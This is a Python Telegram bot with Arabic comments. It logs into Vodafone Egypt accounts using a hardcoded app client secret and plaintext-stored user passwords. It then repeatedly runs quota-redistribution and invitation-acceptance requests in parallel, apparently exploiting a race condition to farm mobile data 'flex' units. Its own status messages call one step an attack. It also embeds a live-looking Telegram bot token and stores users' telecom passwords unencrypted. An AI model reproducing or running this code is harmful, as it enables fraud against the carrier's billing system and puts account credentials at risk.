import sqlite3
import aiohttp
import asyncio
import requests  # سنستخدمه لإرسال الرسائل من الـ Thread
import json
import time
import threading
from types import SimpleNamespace
import logging
import html # <-- 1. تم إضافة هذا

# --- imports لـ Aiogram ---
from aiogram import Bot, Dispatcher, F, types
from aiogram.client.default import DefaultBotProperties # (تم إصلاحه)
from aiogram.enums import ParseMode # <-- 2. تم إضافة هذا
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage 

# --- إعدادات البوت والأدمن ---
TOKEN = "7841209852:AAEGK3vHFdWQrQitMfznQIz-QtTzIRBBIeo"  # !! ضع توكن البوت الخاص بك هنا
ADMIN_ID = 8419466882             # !! ضع معرف الأدمن (صاحب البوت) هنا

# --- إعداد Aiogram ---
# <-- 3. تم تغيير parse_mode إلى HTML
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML)) 
storage = MemoryStorage()
dp = Dispatcher(storage=storage)
logging.basicConfig(level=logging.INFO)
print("Bot is initializing (Aiogram)...")


# ## متغير لتخزين حالة تشغيل الإسكريبت لكل مستخدم
user_script_status = {}

# ## Exception مخصص لإيقاف الإسكريبت
class ScriptStoppedException(Exception):
    pass

# --- 1. إعداد قاعدة البيانات ---
# (نفس الكود... لم يتغير)
def setup_database():
    conn = sqlite3.connect("bot_database.db", check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        is_active INTEGER DEFAULT 0,
        is_configured INTEGER DEFAULT 0,
        owner_id TEXT,
        owner_pass TEXT,
        flying_member_id TEXT,
        flying_member_pass TEXT,
        fixed_member_id TEXT,
        rounds INTEGER
    )
    """)
    conn.commit()
    conn.close()

# --- 2. دوال مساعدة (قاعدة البيانات) ---
# (نفس الكود... لم يتغير)
DB_NAME = "bot_database.db"

def register_user(user_id, username):
    conn = sqlite3.connect(DB_NAME, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    if cursor.fetchone() is None:
        cursor.execute("INSERT INTO users (user_id, username) VALUES (?, ?)", (user_id, username))
        conn.commit()
    conn.close()

def get_user_status(user_id):
    conn = sqlite3.connect(DB_NAME, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT is_active, is_configured FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    conn.close()
    if result:
        return {"is_active": result[0] == 1, "is_configured": result[1] == 1}
    return {"is_active": False, "is_configured": False}

def get_user_config(user_id):
    conn = sqlite3.connect(DB_NAME, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    conn.close()
    if not row:
        return None
    
    config = SimpleNamespace()
    config.user_id = row[0]
    config.owner_id = row[4]
    config.owner_pass = row[5]
    config.flying_member_id = row[6]
    config.flying_member_pass = row[7]
    config.fixed_member_id = row[8]
    config.rounds = row[9]
    config.token_owner = None
    config.token_fly = None
    config.response = None
    config.round = 1
    
    return config

def check_is_admin(user_id):
    return user_id == ADMIN_ID

# --- 3. الأزرار (Keyboards) ---
def get_main_keyboard(user_id):
    status = get_user_status(user_id)
    kb = [
        [KeyboardButton(text="ℹ️ حالتي")]
    ]
    
    if status["is_active"]:
        kb.append([KeyboardButton(text="⚙️ إعداد/تعديل البيانات")])
        if status["is_configured"]:
            kb.append([
                KeyboardButton(text="🚀 تشغيل الإسكريبت"),
                KeyboardButton(text="🛑 إيقاف الإسكريبت")
            ])
            
    if check_is_admin(user_id):
        kb.append([KeyboardButton(text="/admin")])
        
    return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)

def get_admin_keyboard():
    kb = [
        [InlineKeyboardButton(text="📋 عرض المستخدمين", callback_data="admin_list_users")],
        [
            InlineKeyboardButton(text="✅ تفعيل مستخدم", callback_data="admin_activate"),
            InlineKeyboardButton(text="❌ إلغاء تفعيل", callback_data="admin_deactivate")
        ]
    ]
    return InlineKeyboardMarkup(inline_keyboard=kb)

# --- 4. حالات FSM (لخطوات الإعداد وخطوات الأدمن) ---
class AdminStates(StatesGroup):
    awaiting_activation_id = State()
    awaiting_deactivation_id = State()

class ConfigStates(StatesGroup):
    awaiting_owner_id = State()
    awaiting_owner_pass = State()
    awaiting_flying_id = State()
    awaiting_flying_pass = State()
    awaiting_fixed_id = State()
    awaiting_rounds = State()

# --- 5. أوامر البوت الأساسية ومعالجات الأدمن ---
@dp.message(Command("start"))
async def send_welcome(message: Message):
    user = message.from_user
    register_user(user.id, user.username or user.first_name)
    
    # <-- 4. تم تأمين اسم المستخدم وتغيير التنسيق
    user_first_name_safe = html.escape(user.first_name)
    
    welcome_text = f"أهلاً بك {user_first_name_safe}!\n"
    status = get_user_status(user.id)
    
    if status["is_active"]:
        welcome_text += "حسابك مُفعّل. "
        if status["is_configured"]:
            welcome_text += " وبياناتك مسجلة. جاهز للبدء!"
        else:
            welcome_text += "اضغط '⚙️ إعداد/تعديل البيانات' لإدخال بياناتك."
    else:
        # تغيير التنسيق من ` (Markdown) إلى <code> (HTML)
        welcome_text += f"حسابك غير مُفعّل حالياً. للتفعيل، أرسل للأدمن الـ ID الخاص بك: <code>{user.id}</code>"
        
    await message.answer(welcome_text, reply_markup=get_main_keyboard(user.id))

@dp.message(Command("admin"))
async def admin_panel(message: Message):
    if not check_is_admin(message.from_user.id):
        await message.reply("هذا الأمر مخصص للأدمن فقط.")
        return
    await message.answer("أهلاً بك في لوحة تحكم الأدمن:", reply_markup=get_admin_keyboard())

@dp.callback_query(F.data.startswith('admin_'))
async def handle_admin_callbacks(call: CallbackQuery, state: FSMContext):
    if not check_is_admin(call.from_user.id):
        await call.answer("أنت لست الأدمن!", show_alert=True)
        return

    await call.answer() 
    chat_id = call.message.chat.id

    if call.data == "admin_list_users":
        conn = sqlite3.connect(DB_NAME, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute("SELECT user_id, username, is_active, is_configured FROM users")
        rows = cursor.fetchall()
        conn.close()
        
        response = "قائمة المستخدمين:\n--------------------\n"
        if not rows:
            response = "لا يوجد مستخدمين مسجلين بعد."
        else:
            for row in rows:
                user_id, username, is_active, is_configured = row
                status = "مُفعّل ✅" if is_active == 1 else "غير مُفعّل ❌"
                config = "مسجل ⚙️" if is_configured == 1 else "غير مسجل ➖"
                
                # <-- 5. تم تأمين اسم المستخدم وتغيير التنسيق
                safe_username = html.escape(username or "N/A") 
                response += f"User: {safe_username} (ID: <code>{user_id}</code>)\n"
                response += f"الحالة: {status} | البيانات: {config}\n--------------------\n"
                
        await call.message.answer(response) 

    elif call.data == "admin_activate":
        await call.message.answer("أرسل الآن ID المستخدم الذي تريد تفعيله:")
        await state.set_state(AdminStates.awaiting_activation_id)

    elif call.data == "admin_deactivate":
        await call.message.answer("أرسل الآن ID المستخدم الذي تريد إلغاء تفعيله:")
        await state.set_state(AdminStates.awaiting_deactivation_id)

@dp.message(AdminStates.awaiting_activation_id)
async def process_activation(message: Message, state: FSMContext):
    if not check_is_admin(message.from_user.id): return
    try:
        user_id_to_activate = int(message.text)
        conn = sqlite3.connect(DB_NAME, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET is_active = 1 WHERE user_id = ?", (user_id_to_activate,))
        conn.commit()
        
        if cursor.rowcount == 0:
            await message.answer(f"لم يتم العثور على مستخدم بالـ ID: {user_id_to_activate}")
        else:
            await message.answer(f"✅ تم تفعيل المستخدم: {user_id_to_activate}")
            try:
                await bot.send_message(user_id_to_activate, "🎉 تهانينا! تم تفعيل حسابك.", reply_markup=get_main_keyboard(user_id_to_activate))
            except Exception as e:
                print(f"Could not notify user {user_id_to_activate}: {e}")
        conn.close()
    except ValueError:
        await message.reply("خطأ. الرجاء إرسال ID رقمي صحيح.")
    
    await state.clear() 

@dp.message(AdminStates.awaiting_deactivation_id)
async def process_deactivation(message: Message, state: FSMContext):
    if not check_is_admin(message.from_user.id): return
    try:
        user_id_to_deactivate = int(message.text)
        conn = sqlite3.connect(DB_NAME, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET is_active = 0 WHERE user_id = ?", (user_id_to_deactivate,))
        conn.commit()
        
        if cursor.rowcount == 0:
            await message.answer(f"لم يتم العثور على مستخدم بالـ ID: {user_id_to_deactivate}")
        else:
            await message.answer(f"❌ تم إلغاء تفعيل المستخدم: {user_id_to_deactivate}")
            try:
                await bot.send_message(user_id_to_deactivate, "تم إلغاء تفعيل حسابك.", reply_markup=get_main_keyboard(user_id_to_deactivate))
            except Exception as e:
                print(f"Could not notify user {user_id_to_deactivate}: {e}")
        conn.close()
    except ValueError:
        await message.reply("خطأ. الرجاء إرسال ID رقمي صحيح.")
        
    await state.clear() 

# --- 6. خطوات إعداد بيانات المستخدم (FSM Conversation) ---

async def start_config_conversation(message: Message, state: FSMContext):
    await state.clear() 
    # هذه الرسالة الآن آمنة لأن البوت يستخدم HTML بشكل افتراضي
    await message.answer("--- خطوة 1 من 6 ---\nأدخل رقم المالك (owner_id):")
    await state.set_state(ConfigStates.awaiting_owner_id)

@dp.message(ConfigStates.awaiting_owner_id)
async def process_owner_id_step(message: Message, state: FSMContext):
    await state.update_data(owner_id=message.text)
    await message.answer("--- خطوة 2 من 6 ---\nأدخل كلمة مرور المالك (owner_pass):\n(⚠️ تحذير: سيتم حفظها)")
    await state.set_state(ConfigStates.awaiting_owner_pass)

@dp.message(ConfigStates.awaiting_owner_pass)
async def process_owner_pass_step(message: Message, state: FSMContext):
    await state.update_data(owner_pass=message.text)
    await message.answer("--- خطوة 3 من 6 ---\nأدخل رقم العضو الطائر (flying_member_id):")
    await state.set_state(ConfigStates.awaiting_flying_id)

@dp.message(ConfigStates.awaiting_flying_id)
async def process_flying_id_step(message: Message, state: FSMContext):
    await state.update_data(flying_member_id=message.text)
    await message.answer("--- خطوة 4 من 6 ---\nأدخل كلمة مرور العضو الطائر (flying_member_pass):\n(⚠️ تحذير: سيتم حفظها)")
    await state.set_state(ConfigStates.awaiting_flying_pass)

@dp.message(ConfigStates.awaiting_flying_pass)
async def process_flying_pass_step(message: Message, state: FSMContext):
    await state.update_data(flying_member_pass=message.text)
    await message.answer("--- خطوة 5 من 6 ---\nأدخل رقم العضو الثابت (fixed_member_id):")
    await state.set_state(ConfigStates.awaiting_fixed_id)

@dp.message(ConfigStates.awaiting_fixed_id)
async def process_fixed_id_step(message: Message, state: FSMContext):
    await state.update_data(fixed_member_id=message.text)
    await message.answer("--- خطوة 6 من 6 ---\nأدخل عدد الدورات (rounds):")
    await state.set_state(ConfigStates.awaiting_rounds)

@dp.message(ConfigStates.awaiting_rounds)
async def process_rounds_step(message: Message, state: FSMContext):
    chat_id = message.chat.id
    try:
        rounds = int(message.text)
        await state.update_data(rounds=rounds)
        
        data = await state.get_data() 
        
        conn = sqlite3.connect(DB_NAME, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute("""
            UPDATE users 
            SET owner_id = ?, owner_pass = ?, flying_member_id = ?, flying_member_pass = ?, fixed_member_id = ?, rounds = ?, is_configured = 1
            WHERE user_id = ?
        """, (data['owner_id'], data['owner_pass'], data['flying_member_id'], data['flying_member_pass'], data['fixed_member_id'], data['rounds'], chat_id))
        conn.commit()
        conn.close()
        
        await state.clear() 
        await message.answer("✅ تم حفظ جميع الإعدادات بنجاح!", reply_markup=get_main_keyboard(chat_id))
        
    except ValueError:
        await message.reply("خطأ. عدد الدورات يجب أن يكون رقماً. حاول مرة أخرى:")
        await state.set_state(ConfigStates.awaiting_rounds)
    except Exception as e:
        await message.answer(f"حدث خطأ أثناء الحفظ: {e}")
        await state.clear() 


# --- 7. دوال الإسكريبت (مُعدّلة للعمل من Thread) ---

def bot_send_http(chat_id, text):
    """يرسل رسالة باستخدام requests (للاستخدام داخل الـ Thread)"""
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        # لا نحدد parse_mode هنا، ستُرسل كنص عادي (وهو آمن)
        payload = {"chat_id": chat_id, "text": text}
        response = requests.post(url, json=payload, timeout=5)
        return response.json() 
    except Exception as e:
        print(f"[Bot Send HTTP Error] User {chat_id}: {e}")
        return None

def bot_edit_http(chat_id, message_id, text):
    """يعدل رسالة باستخدام requests (للاستخدام داخل الـ Thread)"""
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/editMessageText"
        payload = {"chat_id": chat_id, "message_id": message_id, "text": text}
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        if "message is not modified" not in str(e):
            print(f"[Bot Edit HTTP Error] User {chat_id}: {e}")


def dynamic_countdown(chat_id, total_seconds, message_prefix):
    """
    يرسل رسالة ويعدلها كل 10 ثواني (لتجنب الحظر).
    """
    start_text = f"⏳ {message_prefix} بدء العد: {total_seconds} ثانية..."
    sent_msg_data = bot_send_http(chat_id, start_text)
    
    if not sent_msg_data or not sent_msg_data.get('ok'):
        print(f"Failed to send initial countdown message to {chat_id}")
        # إذا فشل إرسال الرسالة الأولية (بسبب حظر سابق)، نوقف الدورة
        raise ScriptStoppedException(f"Failed to send initial countdown message (Maybe Telegram Flood?)")
        
    msg_id = sent_msg_data['result']['message_id']
    
    last_text = ""
    last_edit_time = time.time()
    
    for i in range(total_seconds, 0, -1):
        # التحقق من زر الإيقاف كل ثانية
        if not user_script_status.get(chat_id, True):
            bot_edit_http(chat_id, msg_id, f"🛑 {message_prefix} تم الإيقاف يدوياً")
            raise ScriptStoppedException("User requested stop during countdown")

        m, s = divmod(i, 60)
        timer_text = f"{m:02d}:{s:02d}"
        new_text = f"⏳ {message_prefix} {timer_text}"
        
        current_time = time.time()
        
        # ## التعديل الأهم: ##
        # التحديث فقط كل 10 ثواني (أو إذا كانت هذه آخر ثانية)
        if (new_text != last_text) and (current_time - last_edit_time > 10 or i == 1): 
            try:
                bot_edit_http(chat_id, msg_id, new_text)
                last_text = new_text
                last_edit_time = current_time
            except Exception as e:
                # إذا فشل التعديل (بسبب الحظر)، نتجاهله ونكمل العد
                print(f"Failed to edit countdown message: {e}")
        
        time.sleep(1) # ما زلنا ننتظر ثانية، لكننا لا *نعدل* الرسالة
        
    try:
        bot_edit_http(chat_id, msg_id, f"✅ {message_prefix} اكتمل الانتظار")
    except Exception as e:
        print(f"Failed to edit final countdown message: {e}")



def signin(user, pas, config, chat_id):
    # (نفس الكود)
    url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
    payload = {
        'grant_type': "password", 'username': user, 'password': pas,
        'client_secret': "95fd95fb-7489-4958-8ae6-d31a525cd20a", 'client_id': "ana-vodafone-app"
    }
    headers = {'User-Agent': "okhttp/3.12.13"}
    config.response = requests.post(url, data=payload, headers=headers)

def tokens(config, chat_id):
    if not user_script_status.get(chat_id, True): raise ScriptStoppedException()
    
    signin(config.owner_id, config.owner_pass, config, chat_id)
    if config.response.status_code == 200:
        bot_send_http(chat_id, "تم تسجيل دخول المالك ✅")
        config.token_owner = config.response.json()["access_token"]
    else:
        bot_send_http(chat_id, f"فشل تسجيل الدخول للمالك ❌ - {config.response.text}")
        raise Exception("Login Failed: Owner")

    if not user_script_status.get(chat_id, True): raise ScriptStoppedException()
    signin(config.flying_member_id, config.flying_member_pass, config, chat_id)
    if config.response.status_code == 200:
        bot_send_http(chat_id, "تم تسجيل دخول العضو الطائر ✅")
        config.token_fly = config.response.json()["access_token"]
    else:
        bot_send_http(chat_id, f"فشل تسجيل الدخول للعضو الطائر ❌ - {config.response.text}")
        raise Exception("Login Failed: Flying Member")

def getflex(config, chat_id):
    if not user_script_status.get(chat_id, True): raise ScriptStoppedException()
    url = f"https://mobile.vodafone.com.eg/services/dxl/usage/usageConsumptionReport?%40type=aggregated&bucket.product.publicIdentifier={config.owner_id}"
    headers = {
        'User-Agent': "okhttp/4.9.3", 'Connection': "Keep-Alive", 'Accept': "application/json",
        'Accept-Encoding': "gzip", 'api-host': "usageConsumptionHost", 'useCase': "aggregated",
        'Authorization': "Bearer " + config.token_owner, 'api-version': "v2",
        'x-agent-operatingsystem': "V14.0.3.0.TJUMIXM", 'clientId': "AnaVodafoneAndroid",
        'x-agent-device': "vayu", 'x-agent-version': "2025.10.1", 'x-agent-build': "1040",
        'Content-Type': "application/json", 'msisdn': config.owner_id, 'Accept-Language': "ar"
    }
    try:
        response = requests.get(url, headers=headers).json()
        bot_send_http(chat_id, "عدد الفلكسات الحالي : " + str(response[3]["bucket"][3]["bucketBalance"][0]["remainingValue"]["amount"]))
    except Exception as e:
        bot_send_http(chat_id, f"خطأ في جلب الفليكسات: {e}")
    dynamic_countdown(chat_id, 300, "انتظر : ")

def flexMember(config, chat_id):
    if not user_script_status.get(chat_id, True): raise ScriptStoppedException()
    url = "https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
    payload = {
      "name": "FlexFamily", "type": "QuotaRedistribution",
      "category": [{"value": "47", "listHierarchyId": "TemplateID"}, {"value": "percentage", "listHierarchyId": "familybehavior"}],
      "parts": {
        "member": [{"id": [{"value": config.owner_id, "schemeName": "MSISDN"}], "type": "Owner"},
                   {"id": [{"value": config.fixed_member_id, "schemeName": "MSISDN"}], "type": "Member"}],
        "characteristicsValue": {"characteristicsValue": [{"characteristicName": "quotaDist1", "value": "10", "type": "percentage"}]}
      }
    }
    headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", 'Connection': "Keep-Alive", 'Accept': "application/json",
        'Accept-Encoding': "gzip", 'Content-Type': "application/json", 'Authorization': "Bearer " + config.token_owner,
        'Accept-Language': "AR", 'msisdn': config.owner_id, 'clientId': "WebsiteConsumer", 'Origin': "https://web.vodafone.com.eg",
        'Referer': "https://web.vodafone.com.eg/spa/familySharing/manageFamily", 'Content-Type': "application/json; charset=utf-8"
    }
    response = requests.patch(url, data=json.dumps(payload), headers=headers)
    if response.status_code == 201:
        bot_send_http(chat_id, "تم تغيير النسبه الي 10% ✅")
    elif response.status_code == 429:
        bot_send_http(chat_id, "تم حظرك (تغيير النسبة) ❌")
    elif response.status_code == 555:
        bot_send_http(chat_id, "النسبه 10% بالفعل ✅")
    else:
        bot_send_http(chat_id, f"خطاء (تغيير النسبة) ❌ - {response.status_code}")
    dynamic_countdown(chat_id, 300, "انتظر : ")

def SendInvitation(config, chat_id):
    if not user_script_status.get(chat_id, True): raise ScriptStoppedException()
    url = "https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
    payload = {
      "name": "FlexFamily", "type": "SendInvitation",
      "category": [{"value": "523", "listHierarchyId": "PackageID"}, {"value": "47", "listHierarchyId": "TemplateID"},
                   {"value": "523", "listHierarchyId": "TierID"}, {"value": "percentage", "listHierarchyId": "familybehavior"}],
      "parts": {
        "member": [{"id": [{"value": config.owner_id, "schemeName": "MSISDN"}], "type": "Owner"},
                   {"id": [{"value": config.flying_member_id, "schemeName": "MSISDN"}], "type": "Member"}],
        "characteristicsValue": {"characteristicsValue": [{"characteristicName": "quotaDist1", "value": "40", "type": "percentage"}]}
      }
    }
    headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", 'Connection': "Keep-Alive", 'Accept': "application/json",
        'Accept-Encoding': "gzip", 'Content-Type': "application/json", 'Authorization': "Bearer " + config.token_owner,
        'Accept-Language': "AR", 'msisdn': config.owner_id, 'clientId': "WebsiteConsumer", 'Origin': "https://web.vodafone.com.eg",
        'Referer': "https://web.vodafone.com.eg/spa/familySharing", 'Content-Type': "application/json; charset=utf-8"
    }
    response = requests.post(url, data=json.dumps(payload), headers=headers)
    if response.status_code == 201:
        bot_send_http(chat_id, "تم ارسال دعوه الي العضو الطائر ✅")
    elif response.status_code == 429:
        bot_send_http(chat_id, "تم حظرك (ارسال دعوة) ❌")
    else:
        bot_send_http(chat_id, f"خطاء (ارسال دعوة) ❌ - {response.status_code}")
    dynamic_countdown(chat_id, 60, "انتظر : ")

async def QuotaRedistribution(config, session, chat_id):
    url = "https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
    payload = {
      "name": "FlexFamily", "type": "QuotaRedistribution",
      "category": [{"value": "47", "listHierarchyId": "TemplateID"}, {"value": "percentage", "listHierarchyId": "familybehavior"}],
      "parts": {
        "member": [{"id": [{"value": config.owner_id, "schemeName": "MSISDN"}], "type": "Owner"},
                   {"id": [{"value": config.fixed_member_id, "schemeName": "MSISDN"}], "type": "Member"}],
        "characteristicsValue": {"characteristicsValue": [{"characteristicName": "quotaDist1", "value": "40", "type": "percentage"}]}
      }
    }
    headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", 'Connection': "Keep-Alive", 'Accept': "application/json",
        'Accept-Encoding': "gzip", 'Content-Type': "application/json", 'Authorization': "Bearer " + config.token_owner,
        'Accept-Language': "AR", 'msisdn': config.owner_id, 'clientId': "WebsiteConsumer", 'Origin': "https://web.vodafone.com.eg",
        'Referer': "https://web.vodafone.com.eg/spa/familySharing/manageFamily", 'Content-Type': "application/json; charset=utf-8"
    }
    async with session.patch(url, json=payload, headers=headers) as response:
        if int(response.status) == 201:
            bot_send_http(chat_id, "✅ تم الهجوم (Quota)")
        elif int(response.status) == 429:
            bot_send_http(chat_id, "تم حظرك (Quota) ❌")
        else:
            bot_send_http(chat_id, f"خطاء (Quota) ❌ - {response.status}")

async def AcceptInvitation(config, session, chat_id):
    url = "https://mobile.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
    payload = {
      "type": "AcceptInvitation", "name": "FlexFamily", "category": [{"listHierarchyId": "TemplateID", "value": "47"}],
      "parts": {
        "member": [{"id": [{"schemeName": "MSISDN", "value": config.owner_id}], "type": "Owner"},
                   {"id": [{"schemeName": "MSISDN", "value": config.flying_member_id}], "type": "Member"}]
      }
    }
    headers = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 14; RMX3630)", 'Connection': "Keep-Alive", 'Accept': "application/json",
        'Accept-Encoding': "gzip", 'Content-Type': "application/json", 'Authorization': "Bearer " + config.token_fly,
        'clientId': "AnaVodafoneAndroid", 'msisdn': config.flying_member_id, 'Accept-Language': "ar",
        'Content-Type': "application/json; charset=utf-8"
    }
    async with session.patch(url, json=payload, headers=headers) as response:
        if int(response.status) == 201:
            bot_send_http(chat_id, "تم قبول الدعوه الي العائله ✅")
        elif int(response.status) == 429:
            bot_send_http(chat_id, "تم حظرك (قبول الدعوة) ❌")
        elif int(response.status) == 500:
            bot_send_http(chat_id, "هناك مشكله في العائله ❌")
        else:
            bot_send_http(chat_id, f"خطاء (قبول الدعوة) ❌ -> {response.status}")

async def run_parallel(config, chat_id):
    if not user_script_status.get(chat_id, True): raise ScriptStoppedException()
    async with aiohttp.ClientSession() as session:
        await asyncio.gather(
            QuotaRedistribution(config, session, chat_id),
            AcceptInvitation(config, session, chat_id)
        )

def FamilyRemoveMember(config, chat_id):
    if not user_script_status.get(chat_id, True): raise ScriptStoppedException()
    url = "https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
    payload = {
      "name": "FlexFamily", "type": "FamilyRemoveMember", "category": [{"value": "47", "listHierarchyId": "TemplateID"}],
      "parts": {
        "member": [{"id": [{"value": config.owner_id, "schemeName": "MSISDN"}], "type": "Owner"},
                   {"id": [{"value": config.flying_member_id, "schemeName": "MSISDN"}], "type": "Member"}],
        "characteristicsValue": {"characteristicsValue": [{"characteristicName": "Disconnect", "value": "0"}, {"characteristicName": "LastMemberDeletion", "value": "1"}]}
      }
    }
    headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 14.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/141.0.0.0 Safari/537.36",
        'Connection': "Keep-Alive", 'Accept': "application/json", 'Accept-Encoding': "gzip", 'Content-Type': "application/json",
        'Authorization': "Bearer " + config.token_owner, 'Accept-Language': "AR", 'msisdn': config.owner_id,
        'clientId': "WebsiteConsumer", 'Content-Type': "application/json; charset=utf-8"
    }
    response = requests.patch(url, data=json.dumps(payload), headers=headers)
    if response.status_code == 201:
        bot_send_http(chat_id, "✅ تم حذف العضو الطائر")
    elif response.status_code == 429:
        bot_send_http(chat_id, "تم حظرك (حذف العضو) ❌")
    else:
        bot_send_http(chat_id, f"خطاء (حذف العضو) ❌ -> {response.status_code}")
    #dynamic_countdown(chat_id, 300, "انتظر : ")

# --- 8. دالة تشغيل الإسكريبت (في Thread منفصل) ---
def run_script_loop(user_id, chat_id):
    try:
        config = get_user_config(user_id)
        if not config:
            bot_send_http(chat_id, "خطأ: لم يتم العثور على بياناتك. يرجى إعدادها أولاً.")
            return

        bot_send_http(chat_id, f"🚀 ... بدء تشغيل الإسكريبت لـ {config.rounds} دورة ... 🚀")
        
        for i in range(config.rounds):
            if not user_script_status.get(user_id, True):
                bot_send_http(chat_id, "تم الإيقاف بواسطة المستخدم قبل بدء الدورة الجديدة.")
                break 

            bot_send_http(chat_id, f"--- 🔁 بدء الدورة رقم: {config.round} ---")
            
            tokens(config, chat_id)
            flexMember(config, chat_id)
            SendInvitation(config, chat_id)
            
            asyncio.run(run_parallel(config, chat_id))
            
            FamilyRemoveMember(config, chat_id)
            getflex(config, chat_id)
            
            bot_send_http(chat_id, f"--- ✅ تم الانتهاء من الدورة رقم: {config.round} ---")
            config.round += 1
            time.sleep(2)
            
        bot_send_http(chat_id, "🎉 اكتمل تشغيل جميع الدورات بنجاح.")

    except ScriptStoppedException:
        bot_send_http(chat_id, "🛑 تم إيقاف الإسكريبت بناءً على طلبك.")
    except Exception as e:
        bot_send_http(chat_id, f"❌ توقف الإسكريبت بسبب خطأ فادح: {e}")
        print(f"[Script Error] User {user_id}: {e}")
    finally:
        user_script_status[user_id] = False
        bot_send_http(chat_id, "تم إيقاف تشغيل الإسكريبت (سواء بنجاح أو بفشل).")

# --- 9. معالج الرسائل الرئيسي (للأزرار) ---
@dp.message(F.text)
async def handle_all_messages(message: Message, state: FSMContext):
    user_id = message.from_user.id
    chat_id = message.chat.id
    text = message.text

    current_state = await state.get_state()
    if current_state is not None:
        await message.reply("الرجاء إكمال الخطوات الحالية أولاً أو إرسال /cancel لإلغائها.")
        return

    status = get_user_status(user_id)

    if text == "ℹ️ حالتي":
        state_text = "مُفعّل ✅" if status["is_active"] else "غير مُفعّل ❌"
        config_text = "مسجل ⚙️" if status["is_configured"] else "غير مسجل ➖"
        running_text = "يعمل 🏃‍♂️" if user_script_status.get(user_id, False) else "متوقف 💤"
        
        # <-- 6. تم تأمين اسم المستخدم وتغيير التنسيق
        safe_first_name = html.escape(message.from_user.first_name)
        
        response = f"مرحباً {safe_first_name}\n"
        response += f"الـ ID الخاص بك: <code>{user_id}</code>\n"
        response += f"حالة الحساب: {state_text}\n"
        response += f"حالة البيانات: {config_text}\n"
        response += f"حالة الإسكريبت: {running_text}"
        await message.reply(response) # تم حذف parse_mode

    elif text == "⚙️ إعداد/تعديل البيانات":
        if not status["is_active"]:
            await message.reply("يجب أن يكون حسابك مُفعّل من قبل الأدمن أولاً.")
            return
        if user_script_status.get(user_id, False):
            await message.reply("لا يمكن تعديل البيانات أثناء تشغيل الإسكريبت. قم بإيقافه أولاً.")
            return
        await start_config_conversation(message, state)

    elif text == "🚀 تشغيل الإسكريبت":
        if not status["is_active"]:
            await message.reply("حسابك غير مُفعّل.")
            return
        if not status["is_configured"]:
            await message.reply("الرجاء إعداد بياناتك أولاً بالضغط على '⚙️ إعداد/تعديل البيانات'.")
            return
        
        if user_script_status.get(user_id, False):
            await message.reply("الإسكريبت يعمل بالفعل! 🏃‍♂️")
            return
            
        await message.reply("جاري بدء تشغيل الإسكريبت... 🏃‍♂️\nسيتم إرسال التحديثات هنا.")
        
        user_script_status[user_id] = True
        
        threading.Thread(target=run_script_loop, args=(user_id, chat_id)).start()

    elif text == "🛑 إيقاف الإسكريبت":
        if not user_script_status.get(user_id, False):
            await message.reply("الإسكريبت متوقف بالفعل 💤")
            return
            
        user_script_status[user_id] = False
        await message.reply("تم إرسال إشارة الإيقاف... ✋\nسيحاول الإسكريبت التوقف عند أقرب نقطة (عادةً أثناء العد التنازلي).")

# --- 10. التشغيل ---
async def main():
    print("Setting up database...")
    setup_database()
    print("Database ready.")
    print("Bot is running (Polling)...")
    
    # <-- 7. تم إصلاح خطأ .wait_closed()
    await dp.storage.close()
    
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
